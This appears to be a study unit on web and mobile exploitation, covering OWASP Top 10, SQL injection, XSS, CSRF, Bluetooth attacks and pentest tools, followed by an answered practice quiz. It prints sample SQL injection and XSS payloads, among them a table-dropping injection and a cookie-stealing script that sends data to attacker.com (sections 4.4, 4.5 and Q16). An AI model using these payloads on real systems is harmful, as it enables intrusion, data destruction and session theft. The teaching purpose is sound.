# Unit 4: Web Application & Mobile Device Exploitation

---

## Part A: Web Application Exploitation

---

## 4.1 OWASP Top 10 Vulnerabilities

The **OWASP (Open Web Application Security Project) Top 10** is a standard awareness document representing the most critical web application security risks.

### OWASP Top 10 (2021):

| Rank | Vulnerability | Description |
|---|---|---|
| **A01** | **Broken Access Control** | Users can act outside their intended permissions |
| **A02** | **Cryptographic Failures** | Failures related to encryption (formerly Sensitive Data Exposure) |
| **A03** | **Injection** | SQL injection, NoSQL injection, LDAP injection, command injection |
| **A04** | **Insecure Design** | Flaws in design and architecture |
| **A05** | **Security Misconfiguration** | Default configs, unnecessary features, verbose error messages |
| **A06** | **Vulnerable and Outdated Components** | Using libraries/frameworks with known vulnerabilities |
| **A07** | **Identification and Authentication Failures** | Weak authentication, session management issues |
| **A08** | **Software and Data Integrity Failures** | CI/CD pipeline issues, unsigned updates |
| **A09** | **Security Logging and Monitoring Failures** | Insufficient logging and alerting |
| **A10** | **Server-Side Request Forgery (SSRF)** | Exploiting server to make requests to internal resources |

---

## 4.2 Session Hijacking

**Session Hijacking** is the exploitation of a valid session to gain unauthorized access to a system or service.

### Types of Session Hijacking:

| Type | Description |
|---|---|
| **Active Hijacking** | Attacker takes over an active session |
| **Passive Hijacking** | Attacker monitors/sniffs session traffic without taking control |

### Session Hijacking Techniques:
- **Session Sniffing** – Capturing session tokens via packet capture
- **Session Sidejacking** – Intercepting unencrypted cookies over Wi-Fi
- **Cross-Site Scripting (XSS)** – Stealing session cookies via malicious scripts
- **Session Fixation** – Forcing a user to use a known session ID
- **Man-in-the-Middle (MITM)** – Intercepting traffic between client and server
- **Cookie Theft** – Stealing session cookies from the browser

### Prevention:
- Use HTTPS (encrypted communication)
- Set `HttpOnly` and `Secure` flags on cookies
- Implement session timeout
- Regenerate session IDs after login
- Use token-based authentication (JWT)

---

## 4.3 Cross-Site Request Forgery (CSRF)

**CSRF** tricks an authenticated user into submitting a malicious request to a web application.

### How CSRF Works:
1. User logs into a legitimate website (e.g., bank.com)
2. User visits a malicious website while still logged in
3. Malicious site sends a request to bank.com using the user's session
4. Bank.com processes the request thinking it's from the legitimate user

### CSRF Prevention:
- **Anti-CSRF tokens** – Unique tokens in forms that must match server-side
- **SameSite cookie attribute** – Prevents cookies from being sent with cross-site requests
- **Referer header validation** – Check where the request originated
- **CAPTCHA** – Human verification for sensitive actions
- **Re-authentication** – Require password for critical operations

---

## 4.4 SQL Injection (SQLi)

**SQL Injection** is an attack that inserts malicious SQL code into application queries through user input fields.

### Types of SQL Injection:

| Type | Description |
|---|---|
| **In-band SQLi (Classic)** | Attacker uses the same channel to launch attack and gather results |
| ├── **Error-based** | Uses database error messages to extract information |
| └── **Union-based** | Uses UNION SQL operator to combine results |
| **Blind SQLi** | No visible error messages or data; inferred from behavior |
| ├── **Boolean-based** | Sends true/false queries and observes different responses |
| └── **Time-based** | Uses time delays (e.g., `SLEEP()`) to infer results |
| **Out-of-band SQLi** | Uses different channel (DNS, HTTP) to extract data |

### Common SQL Injection Payloads:
```sql
' OR 1=1 --                    -- Basic authentication bypass
' UNION SELECT 1,2,3 --       -- Union-based injection
' AND SLEEP(5) --              -- Time-based blind injection
'; DROP TABLE users --         -- Destructive injection
' OR '1'='1                    -- String-based bypass
```

### Identifying SQLi Vulnerabilities:
- Enter `'` (single quote) in input fields – look for SQL error messages
- Test with `OR 1=1` – if login succeeds, it's vulnerable
- Use automated tools like SQLmap
- Check for verbose error messages revealing database information

### SQL Injection Prevention:
- **Parameterized queries / Prepared statements** – Most effective defense
- **Input validation** – Whitelist acceptable input
- **Stored procedures** – Pre-compiled SQL statements
- **Least privilege** – Database user with minimal permissions
- **WAF (Web Application Firewall)** – Filter malicious SQL input
- **Escape special characters** – Sanitize user input

---

## 4.5 Cross-Site Scripting (XSS)

**XSS** attacks inject malicious scripts into web pages viewed by other users.

### Types of XSS:

| Type | Description | Persistence |
|---|---|---|
| **Reflected XSS** | Script is reflected off the web server (in URL, search query) | Non-persistent |
| **Stored XSS** | Script is permanently stored on the target server (in database, comment) | Persistent |
| **DOM-based XSS** | Script executes in the browser's DOM without server involvement | Client-side |

### Common XSS Payloads:
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>
<svg onload=alert('XSS')>
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

### XSS Impact:
- Steal session cookies
- Redirect users to malicious sites
- Deface websites
- Capture keystrokes
- Distribute malware

### XSS Prevention:
- **Input validation** – Validate and sanitize all user inputs
- **Output encoding** – Encode data before rendering in HTML
- **Content Security Policy (CSP)** – Restrict script execution sources
- **HttpOnly cookies** – Prevent JavaScript from accessing cookies
- **WAF** – Web Application Firewall

---

## 4.6 Browser Exploitation

### Techniques:
- **Browser exploit frameworks** – BeEF (Browser Exploitation Framework)
- **Drive-by downloads** – Malware downloaded without user consent
- **Malicious extensions** – Browser add-ons with hidden malware
- **Man-in-the-Browser (MitB)** – Trojan modifies web pages in real-time
- **Clickjacking** – Hiding malicious actions behind legitimate UI elements

---

## 4.7 Web Application Pentesting Tools

| Tool | Purpose |
|---|---|
| **OWASP ZAP (Zed Attack Proxy)** | Free web app security scanner and proxy |
| **Burp Suite** | Comprehensive web app security testing platform |
| **SQLmap** | Automated SQL injection detection and exploitation |
| **Nikto** | Web server vulnerability scanner |
| **DirBuster / Gobuster** | Directory and file brute-forcing |
| **WPScan** | WordPress vulnerability scanner |
| **BeEF** | Browser Exploitation Framework |
| **w3af** | Web Application Attack and Audit Framework |
| **Commix** | Command injection exploitation |

### Burp Suite Key Features:
- **Proxy** – Intercepts and modifies HTTP/HTTPS traffic
- **Scanner** – Automated vulnerability scanning
- **Intruder** – Automated customized attacks (fuzzing, brute-force)
- **Repeater** – Manually modify and resend requests
- **Decoder** – Encode/decode data formats
- **Sequencer** – Analyze session token randomness

### OWASP ZAP Key Features:
- **Intercepting proxy** – Capture and modify requests
- **Active scanner** – Automatically find vulnerabilities
- **Passive scanner** – Analyze traffic without attacking
- **Fuzzer** – Send random/malformed data to find bugs
- **Spider** – Crawl web applications

---

## Part B: Mobile Device Exploitation

---

## 4.8 Mobile Deployment Models

| Model | Description |
|---|---|
| **BYOD (Bring Your Own Device)** | Employees use personal devices for work |
| **COPE (Corporate-Owned, Personally Enabled)** | Company provides devices; personal use allowed |
| **COBO (Corporate-Owned, Business Only)** | Company provides devices; business use only |
| **CYOD (Choose Your Own Device)** | Employee chooses from approved company devices |

---

## 4.9 Mobile Vulnerabilities

### Common Vulnerabilities:
- **Insecure data storage** – Sensitive data stored in plain text
- **Weak server-side controls** – Poorly secured backend APIs
- **Insecure communication** – Unencrypted data transmission
- **Improper session handling** – Session tokens not properly managed
- **Insufficient cryptography** – Weak or improperly implemented encryption
- **Client-side injection** – SQL injection, XSS in mobile apps
- **Security decisions via untrusted inputs** – Trusting data from external sources
- **Side channel data leakage** – Data exposed through logs, clipboard, screenshots

### Mobile Attack Vectors:
- **Malicious apps** – Apps containing malware or spyware
- **Jailbreaking / Rooting** – Removing OS restrictions
- **Man-in-the-Middle** – Intercepting mobile traffic
- **SMS/MMS attacks** – Exploiting messaging services
- **Bluetooth attacks** – Exploiting Bluetooth vulnerabilities

---

## 4.10 Bluetooth Exploitation

### Bluetooth Attacks:

| Attack | Description |
|---|---|
| **Bluejacking** | Sending unsolicited messages via Bluetooth (annoying but not harmful) |
| **Bluesnarfing** | Unauthorized access to information through Bluetooth (contacts, calendar, etc.) |
| **Bluebugging** | Taking control of a device via Bluetooth (make calls, send messages) |
| **BlueBorne** | Exploiting Bluetooth vulnerabilities to spread malware without pairing |

### Bluetooth Hacking Tools:
- **hcitool** – Bluetooth scanning and management
- **btscanner** – Bluetooth device discovery
- **Spooftooph** – Bluetooth device spoofing
- **BlueRanger** – Bluetooth proximity detection

---

## 4.11 Mobile Malware

### Types:
- **Trojans** – Disguised as legitimate apps
- **Ransomware** – Encrypts device data for ransom
- **Spyware** – Secretly monitors user activity
- **Adware** – Displays unwanted advertisements
- **Rootkits** – Gains root access to device

### Exploitation Tools:
- **Metasploit** – Has Android/iOS payloads
- **AndroRAT** – Android Remote Administration Tool
- **Drozer** – Android security assessment framework
- **Frida** – Dynamic instrumentation toolkit

---

## MCQ Practice Questions

---

**Q1.** Which OWASP Top 10 vulnerability involves inserting malicious SQL code into application queries?

A. Broken Access Control  
B. Security Misconfiguration  
**C. Injection** ✅  
D. Cryptographic Failures

> **Explanation:** SQL Injection falls under the "Injection" category (A03) in the OWASP Top 10.

---

**Q2.** What type of XSS attack stores the malicious script permanently on the target server?

A. Reflected XSS  
**B. Stored XSS** ✅  
C. DOM-based XSS  
D. Blind XSS

> **Explanation:** Stored (persistent) XSS saves the malicious script on the server (e.g., in a database), affecting all users who view the page.

---

**Q3.** Which tool is used for automated SQL injection detection and exploitation?

A. Burp Suite  
B. OWASP ZAP  
**C. SQLmap** ✅  
D. Nikto

> **Explanation:** SQLmap is specifically designed for automated detection and exploitation of SQL injection vulnerabilities.

---

**Q4.** A CSRF attack works because:

A. The web server doesn't validate input  
**B. The browser automatically sends cookies with requests to the target site** ✅  
C. The attacker has the user's password  
D. JavaScript is disabled in the browser

> **Explanation:** CSRF exploits the browser's automatic inclusion of cookies in requests to a trusted site.

---

**Q5.** Which session hijacking prevention technique involves setting a cookie flag that prevents JavaScript from accessing the cookie?

A. Secure flag  
**B. HttpOnly flag** ✅  
C. SameSite flag  
D. Domain flag

> **Explanation:** The HttpOnly flag prevents client-side JavaScript from accessing the cookie, protecting against XSS-based cookie theft.

---

**Q6.** What SQL injection payload would you use to test if a login form is vulnerable?

A. `SELECT * FROM users`  
**B. `' OR 1=1 --`** ✅  
C. `DROP TABLE users`  
D. `INSERT INTO users VALUES('admin')`

> **Explanation:** `' OR 1=1 --` is a classic authentication bypass payload that always evaluates to true.

---

**Q7.** Which Burp Suite component is used to intercept and modify HTTP requests?

**A. Proxy** ✅  
B. Scanner  
C. Intruder  
D. Decoder

> **Explanation:** The Proxy component in Burp Suite intercepts HTTP/HTTPS traffic between the browser and the server.

---

**Q8.** Which mobile deployment model means the company provides the device and only business use is allowed?

A. BYOD  
B. COPE  
**C. COBO** ✅  
D. CYOD

> **Explanation:** COBO (Corporate-Owned, Business Only) means the company provides the device and restricts usage to business purposes only.

---

**Q9.** Which Bluetooth attack involves unauthorized access to contact information on a victim's phone?

A. Bluejacking  
**B. Bluesnarfing** ✅  
C. Bluebugging  
D. BlueBorne

> **Explanation:** Bluesnarfing is the unauthorized access to information (contacts, calendar, emails) through Bluetooth.

---

**Q10.** What is the MOST effective defense against SQL injection?

A. Input validation  
**B. Parameterized queries / Prepared statements** ✅  
C. Web Application Firewall  
D. Escaping special characters

> **Explanation:** Parameterized queries (prepared statements) separate SQL code from data, making SQL injection impossible.

---

**Q11.** Which type of SQL injection infers information by observing time delays in the database response?

A. Error-based SQLi  
B. Union-based SQLi  
C. Boolean-based Blind SQLi  
**D. Time-based Blind SQLi** ✅

> **Explanation:** Time-based Blind SQLi uses functions like `SLEEP()` and `WAITFOR DELAY` to infer data based on response times.

---

**Q12.** In a Reflected XSS attack, where does the malicious script come from?

A. The database  
**B. The URL or request parameters reflected by the server** ✅  
C. A third-party server  
D. The browser's local storage

> **Explanation:** Reflected XSS is non-persistent – the malicious script is included in the URL/request and reflected back by the server.

---

**Q13.** Which OWASP Top 10 vulnerability involves exploiting a server to make requests to internal resources?

A. Broken Access Control  
B. Injection  
C. Insecure Design  
**D. Server-Side Request Forgery (SSRF)** ✅

> **Explanation:** SSRF (A10) allows an attacker to make the server send requests to internal resources or other systems.

---

**Q14.** Which mobile attack involves removing OS restrictions to gain root access?

A. Side-channel attack  
**B. Jailbreaking / Rooting** ✅  
C. Bluejacking  
D. MITM attack

> **Explanation:** Jailbreaking (iOS) and Rooting (Android) remove manufacturer/OS restrictions, giving full system access.

---

**Q15.** An anti-CSRF token is used to:

A. Encrypt form data  
**B. Verify that a request originated from the legitimate application** ✅  
C. Prevent SQL injection  
D. Block XSS attacks

> **Explanation:** Anti-CSRF tokens are unique, secret values in forms that verify the request came from the legitimate application, not a malicious site.

---

**Q16.** Which XSS payload would steal a user's cookies and send them to an attacker's server?

A. `<script>alert('XSS')</script>`  
**B. `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`** ✅  
C. `<img src=x onerror=alert('XSS')>`  
D. `<body onload=alert('XSS')>`

> **Explanation:** This payload redirects the user to the attacker's server with the victim's cookies as a URL parameter.

---

**Q17.** BeEF (Browser Exploitation Framework) is used for:

A. SQL injection  
B. Network scanning  
**C. Browser exploitation and hooking** ✅  
D. Password cracking

> **Explanation:** BeEF is specifically designed for exploiting web browsers by hooking them through XSS or other injection points.

---

**Q18.** Which Content Security Policy (CSP) directive helps prevent XSS attacks?

A. `content-type`  
**B. `script-src`** ✅  
C. `access-control-allow-origin`  
D. `x-frame-options`

> **Explanation:** The `script-src` directive in CSP defines which sources are allowed to execute JavaScript, preventing inline scripts and unauthorized script sources.

---

**Q19.** Which Bluetooth attack sends unsolicited messages but is generally not harmful?

**A. Bluejacking** ✅  
B. Bluesnarfing  
C. Bluebugging  
D. BlueBorne

> **Explanation:** Bluejacking sends unsolicited messages via Bluetooth. It's annoying but doesn't access data or take control of the device.

---

**Q20.** What does the Burp Suite "Intruder" component do?

A. Intercepts HTTP traffic  
**B. Performs automated, customizable attacks like fuzzing and brute-forcing** ✅  
C. Decodes encoded data  
D. Crawls web applications

> **Explanation:** The Intruder component automates customized attacks by sending modified requests with different payloads (fuzzing, brute-forcing, etc.).

---
